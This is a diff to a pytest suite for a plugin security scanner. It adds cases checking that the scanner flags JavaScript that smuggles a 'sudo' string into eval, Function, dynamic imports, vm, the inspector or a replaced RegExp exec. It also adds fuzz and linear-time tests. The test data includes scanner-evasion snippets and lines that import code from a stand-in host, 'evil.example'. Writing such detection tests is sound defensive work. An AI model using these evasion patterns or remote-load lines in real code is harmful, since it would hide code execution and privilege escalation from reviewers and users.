@@ -14,6 +14,7 @@ from pathlib import Path
 import pytest
 
 from tools.plugin_guard_context import JsLexError, JsSinkInventory, lex_js
+from tools.skills_guard import Finding
 from tools.plugin_guard import (
     scan_plugin,
     should_allow_plugin_install,
@@ -740,7 +741,7 @@ class TestMinifiedBundleSudoData:
         # tricky shapes
         'const c=`sudo ${a}`;w.exec(c);',                        # sudo in a template passed to exec
         'const t=`${"sudo"}`;',                                  # inside a substitution: never data
-        'const p={sudo:"sudo"};const c=p.sudo+" -n true";cp.spawn(c);',   # built, then spawned
+        'const p={kind:"sudo"};const c=p.kind+" -n true";cp.spawn(c);',   # built, then spawned
         '/* {sudo:"sudo"} */const x=eval(y);',                   # in a comment, real exec after it
         'w.run(x.return/1,{sudo:"sudo"});',                      # `.return /` cannot hide the run(
         'w.run(()=>{switch(m){case"sudo":go()}});',              # data inside a callback that run( calls
@@ -749,21 +750,39 @@ class TestMinifiedBundleSudoData:
         'f()({kind:"sudo"});',
         '["approval","sudo"].includes(m);',                      # an array element is not judged
         'cmd="sudo";',
-        'x={}/1;const k={sudo:"sudo"};w.spawn(k.sudo)/1;',       # `}/` read as a regex hides nothing
-        'const r=/"/;const k={sudo:"sudo"};globalThis["ev"+"al"](k.sudo);',
-        '/*"*/const k={sudo:"sudo"};/*"*/(0,eval)(k.sudo);',
-        'const k={sudo:"sudo"};[]["filter"]["constructor"](k.sudo)();',
-        'const k={sudo:"sudo"};x.constructor.constructor(k.sudo)();',
-        'const k={sudo:"sudo"};setTimeout("go(k.sudo)",1);',
-        'const k={sudo:"sudo"};import(k.sudo);',
-        'const k={sudo:"sudo"};\\u0065val(k.sudo);',             # an identifier escape: unsure
-        "const t=`${`${\"`\"}`}`;const k={sudo:\"sudo\"};new Function(k.sudo)();",
-        'const k={sudo:"sudo"};Bun.$`${k.sudo}`;',
-        'const k={sudo:"sudo"};process.binding("spawn_sync").spawn(k);',
+        'x={}/1;const k={kind:"sudo"};w.spawn(k.kind)/1;',       # `}/` read as a regex hides nothing
+        'const r=/"/;const k={kind:"sudo"};globalThis["ev"+"al"](k.kind);',
+        '/*"*/const k={kind:"sudo"};/*"*/(0,eval)(k.kind);',
+        'const k={kind:"sudo"};[]["filter"]["constructor"](k.kind)();',
+        'const k={kind:"sudo"};x.constructor.constructor(k.kind)();',
+        'const k={kind:"sudo"};setTimeout("go(k.kind)",1);',
+        'const k={kind:"sudo"};import(k.kind);',
+        'const k={kind:"sudo"};\\u0065val(k.kind);',             # an identifier escape: unsure
+        "const t=`${`${\"`\"}`}`;const k={kind:\"sudo\"};new Function(k.kind)();",
+        'const k={kind:"sudo"};Bun.$`${k.kind}`;',
+        'const k={kind:"sudo"};process.binding("spawn_sync").spawn(k);',
+        # review round 2: reach a process without any older sink name
+        'const k={kind:"sudo"};const g=process.getBuiltinModule;g(n)[m](k.kind);',
+        'const k={kind:"sudo"};module.constructor[l](n)[m](k.kind);',
+        'const k={kind:"sudo"};Module._load(n)[m](k.kind);',
+        'const k={kind:"sudo"};import i from"node:inspector";i.open();',
+        'const k={kind:"sudo"};import i from"inspector";',
+        'const k={kind:"sudo"};import w from"node:wasi";',
+        'const k={kind:"sudo"};import w from"wasi";',
+        'const k={kind:"sudo"};import v from"vm";v.x(k.kind);',
+        'const k={kind:"sudo"};import t from"worker_threads";',
+        'const k={kind:"sudo"};import("data:text/javascript,export default 1").then(m=>m(k));',
+        'const k={kind:"sudo"};import("https://evil.example/x.js").then(m=>m.go(k.kind));',
+        'const k={kind:"sudo"};import x from"blob:https://a/b";',
+        'const k={kind:"sudo"};export*from"http://evil.example/x.js";',
+        'w.run?.({kind:"sudo"});',                                # `f?.(` is judged by `f`
+        'const k={kind:"sudo"};// a comment the engine ends here\u2028eval(k.kind);',
+        'const k={kind:"sudo"};/* x */\u2028--> eval(k.kind)',
+        'const k={kind:"sudo"};// ends at a carriage return\reval(k.kind);',
     ])
     def test_running_loading_or_smuggling_sudo_keeps_high(self, tmp_path, line):
         sev, result = self._scan(tmp_path, [line])
-        assert sev == {1: "high"}, line
+        assert 1 in sev and set(sev.values()) == {"high"}, (line, sev)    # a "\r" reads as a second line
         assert result.verdict != "safe"
 
     def test_a_sink_on_another_line_keeps_high(self, tmp_path):
@@ -793,6 +812,29 @@ class TestMinifiedBundleSudoData:
     def test_a_file_the_lexer_cannot_read_keeps_the_line_rules(self, tmp_path, raw):
         sev, _ = self._scan(tmp_path, raw=raw)
         assert sev == {1: "high"}
+
+    @pytest.mark.parametrize("raw", ['const k={sudo:"sudo"};x=\u00b2;\n', 'const k={sudo:"sudo"};x=.\u00b3;\n',
+                                     'const k={sudo:"sudo"};x=\u2460;\n', 'const k={sudo:"sudo"};x=1\u00b2;\n'])
+    def test_unicode_digits_do_not_crash_the_scan(self, tmp_path, raw):
+        """``str.isdigit`` accepts "\u00b2" and "\u2460", the number pattern does not: once that crashed."""
+        sev, _ = self._scan(tmp_path, raw=raw)
+        assert set(sev) == {1}
+
+    def test_a_50k_line_bundle_is_judged_in_linear_time(self, tmp_path):
+        """Every line of a large bundle carries a candidate; finding a line must not re-split the file."""
+        import time
+
+        lines = [f'const a{i}={{sudo:"sudo",kind:"sudo"}};' for i in range(50_000)]
+        plugin = tmp_path / "big"
+        plugin.mkdir()
+        (plugin / "big.js").write_text("\n".join(lines) + "\n", encoding="utf-8")
+        finding = Finding("sudo_usage", "high", "privilege_escalation", "big.js", 1, "", "")
+        start = time.monotonic()
+        inventory = JsSinkInventory(plugin)
+        lowered = sum(inventory.js_data(finding, "big.js", n, line) for n, line in enumerate(lines, 1))
+        elapsed = time.monotonic() - start
+        assert lowered == len(lines)
+        assert elapsed < 3.0, elapsed    # about 1 s on a loaded laptop; the quadratic version took minutes
 
     def test_python_keeps_the_whole_line_rule(self, tmp_path):
         files = dict(BASE_FILES)
@@ -832,6 +874,7 @@ class TestJsLexer:
     @pytest.mark.parametrize("text", [
         "`open", "'open", '"a\nb"', "/open", "/* open", "f(]", "{", "}", "a\\u0062", "`${`", "x=@#",
         "f(function(){}/a/g)", "x={}/2", "for(x of/a/)y()", "a=yield/2", "a<!--b", "a\n--> b", "/**/--> b",
+        "a\u2028b", "// c\u2029b", "/* \u2028 */", "a\r--> b", "/a\u2028/",
     ])
     def test_errors_instead_of_guesses(self, text):
         with pytest.raises(JsLexError):
@@ -841,6 +884,23 @@ class TestJsLexer:
 class TestJsLexerKeepsWhatItCanDecide:
     def test_a_decrement_before_a_comparison_is_code(self):
         assert [t.text for t in lex_js("for(;n-->0;)go()")][3:6] == ["n", "--", ">"]
+
+    def test_line_comments_end_at_a_carriage_return_and_separators_stay_in_strings(self):
+        assert [t.text for t in lex_js("// c\reval(x)")] == ["eval", "(", "x", ")"]
+        assert [t.kind for t in lex_js('x="\u2028";y=`\u2029`')] == ["id", "p", "str", "p", "id", "p", "tpl"]
+
+    @pytest.mark.parametrize("seed", range(4))
+    def test_arbitrary_unicode_never_crashes_the_lexer(self, seed):
+        rng = random.Random(seed)
+        alphabet = (list("0123456789.`'\"/\\*{}()[]$-<>!=;\n\r ") + ["\u2028", "\u2029", "\u00b2", "\u2460",
+                    "\u0663", "\U0001d7d8", "\U0001f600", "\ud800", "\udfff", "\ufeff", "\u00a0", "#", "@", "\x00"])
+        for _ in range(2000):
+            text = "".join(rng.choice(alphabet) if rng.random() < 0.7 else chr(rng.randrange(0x110000))
+                           for _ in range(rng.randint(0, 40)))
+            try:
+                lex_js(text)
+            except JsLexError:
+                pass
 
 
 class TestMinifiedBundleRegexExec:
@@ -873,9 +933,22 @@ class TestMinifiedBundleRegexExec:
         assert sev == {1: "low", 2: "low", 3: "low", 4: "low", 5: "low", 6: "low"}
         assert result.verdict == "safe"
 
-    def test_a_regex_literal_receiver_is_low_even_beside_child_process(self, tmp_path):
+    def test_a_regex_literal_receiver_is_not_enough_beside_child_process(self, tmp_path):
         sev, _ = self._scan(tmp_path, ['/x/.exec("a");', 're.exec("a");', 'const cp=require("child_process");'])
-        assert sev == {1: "low", 2: "high"}
+        assert sev == {1: "high", 2: "high"}
+
+    @pytest.mark.parametrize("line", [
+        'RegExp.prototype.exec=require("child_process").execSync;/x/.exec("id");',
+        'const cp=require("child_process");Foo.prototype.exec=cp.execSync;new Foo().exec("id");',
+        'RegExp.prototype.exec=f;/x/.exec("id");',                    # the replacement alone is a doubt
+        'Foo.prototype.exec=f;new Foo().exec("id");',
+        'RegExp.prototype["exec"]=f;/x/.exec("id");',
+        'Object.defineProperty(RegExp.prototype,"exec",{value:f});/x/.exec("id");',
+    ])
+    def test_a_replaced_exec_keeps_high(self, tmp_path, line):
+        sev, result = self._scan(tmp_path, [line])
+        assert sev == {1: "high"}, line
+        assert result.verdict != "safe"
 
     @pytest.mark.parametrize("line", [
         'import{exec}from"child_process";exec("ls");',            # the imported child_process.exec
@@ -927,19 +1000,34 @@ class TestJsTokenRuleFuzz:
 
     DATA = ['{sudo:"sudo"}', "{sudo:12e4}", 'case"sudo":', 'x!=="sudo"', '{kind:"sudo"}', "'sudo'", "sudo",
             '"sudo"', "`sudo`", "${", "}", "{", "(", ")", "[", "]", ",", ":", ";", "/", "/x/", "`", "'", '"',
-            "//", "/*", "*/", "\n", " ", "a", "b.c", "return", "case", "=", "===", "=>", "?", "\\", "+", "0"]
+            "//", "/*", "*/", "\n", " ", "a", "b.c", "return", "case", "=", "===", "=>", "?", "\\", "+", "0",
+            "\r", "\u2028", "\u2029", "\u00b2", "\u2460", "\u0663", "\U0001d7d8", "\U0001f600", "\ud800", "-->",
+            "<!--", 're.exec("")', '/x/.exec("")']
     SINKS = ['cp.spawn("sudo")', "eval(a)", 'require("x")', "execSync(c)", 'import(c)', "new Function(a)",
              'globalThis["e"+"val"](a)', "$`sudo`", 'import "child_process"', "x.constructor.constructor(a)"]
     RANK = {"low": 0, "medium": 1, "high": 2, "critical": 3}
 
     def _severities(self, tmp_path, name, text, monkeypatch, rule_on):
-        files = dict(BASE_FILES)
-        files["dashboard/app/assets/x.js"] = text
+        plugin = _mk_plugin(tmp_path / name, dict(BASE_FILES))
+        target = plugin / "dashboard" / "app" / "assets" / "x.js"
+        target.parent.mkdir(parents=True)
+        target.write_bytes(text.encode("utf-8", "surrogatepass"))    # a lone surrogate: undecodable
         with monkeypatch.context() as m:
             if not rule_on:
                 m.setattr(JsSinkInventory, "js_data", lambda *a, **k: False)
-            result = scan_plugin(_mk_plugin(tmp_path / name, files), source="owner/repo")
+            result = scan_plugin(plugin, source="owner/repo")
         return {(f.pattern_id, f.file, f.line): f.severity for f in result.findings}
+
+    @staticmethod
+    def _sink_is_code(text, pos):
+        """The inserted sink starts a code token (not inside a comment, string, template or a longer
+        name), or the file cannot be lexed at all (then the rule lowers nothing anyway)."""
+        try:
+            toks = lex_js(text)
+        except JsLexError:
+            return True
+        return any(t.start == pos and not (k and toks[k - 1].kind == "p" and toks[k - 1].text in (".", "?."))
+                   for k, t in enumerate(toks))
 
     STATEMENTS = [
         'const v{i}={{sudo:"sudo",kind:"sudo",n:12e4}};', 'switch(m){{case"sudo":f({i});break}}',
@@ -960,7 +1048,8 @@ class TestJsTokenRuleFuzz:
             has_sink = rng.random() < 0.5
             if has_sink:
                 parts.insert(rng.randint(0, len(parts)), rng.choice(self.SINKS) + ";")
-            text = rng.choice(["", "\n"]).join(parts) + "\n"
+            joiner = rng.choice(["", "\n"])
+            text = joiner.join(parts) + "\n"
             (tmp_path / f"s{n}").mkdir()
             (tmp_path / f"s{n}b").mkdir()
             new = self._severities(tmp_path, f"s{n}", text, monkeypatch, rule_on=True)
@@ -968,11 +1057,31 @@ class TestJsTokenRuleFuzz:
             assert new.keys() == old.keys(), text
             for key, sev in new.items():
                 assert self.RANK[sev] <= self.RANK[old[key]], (text, key)
-                if has_sink and not (key[0] == "exec_string" and "/x/.exec" in text.split("\n")[key[2] - 1]
-                                     and "re" not in text.split("\n")[key[2] - 1].replace("/x/.exec", "")):
+                if has_sink:
                     assert sev == old[key], (text, key)
                 lowered += sev != old[key]
         assert lowered > 0
+
+    @pytest.mark.parametrize("seed", range(6))
+    def test_arbitrary_bytes_and_unicode_never_raise(self, tmp_path, seed):
+        """Random bytes and random code points in .js/.mjs/.cjs, beside a candidate that makes the
+        inventory read them: ``scan_plugin`` returns, whatever is in the files."""
+        rng = random.Random(1000 + seed)
+        for n in range(15):
+            (tmp_path / f"p{n}").mkdir()
+            plugin = _mk_plugin(tmp_path / f"p{n}", dict(BASE_FILES))
+            app = plugin / "dashboard" / "app"
+            app.mkdir(parents=True)
+            (app / "index.js").write_text('const k={sudo:"sudo"};\n', encoding="utf-8")
+            for suffix in (".js", ".mjs", ".cjs"):
+                if rng.random() < 0.5:
+                    data = bytes(rng.randrange(256) for _ in range(rng.randint(0, 300)))
+                else:
+                    text = "".join(chr(rng.randrange(0x110000)) for _ in range(rng.randint(0, 120)))
+                    data = text.encode("utf-8", "surrogatepass")
+                (app / f"r{suffix}").write_bytes(data)
+            result = scan_plugin(plugin, source="owner/repo")
+            assert result.verdict in ("safe", "caution", "dangerous")
 
     @pytest.mark.parametrize("seed", range(8))
     def test_random_streams(self, tmp_path, monkeypatch, seed):
@@ -981,7 +1090,9 @@ class TestJsTokenRuleFuzz:
             parts = [rng.choice(self.DATA) for _ in range(rng.randint(1, 30))]
             has_sink = rng.random() < 0.5
             if has_sink:
-                parts.insert(rng.randint(0, len(parts)), rng.choice(self.SINKS))
+                at = rng.randint(0, len(parts))
+                parts.insert(at, rng.choice(self.SINKS))
+                has_sink = self._sink_is_code("".join(parts) + "\n", len("".join(parts[:at])))
             text = "".join(parts) + "\n"
             (tmp_path / f"{n}").mkdir()
             (tmp_path / f"{n}b").mkdir()
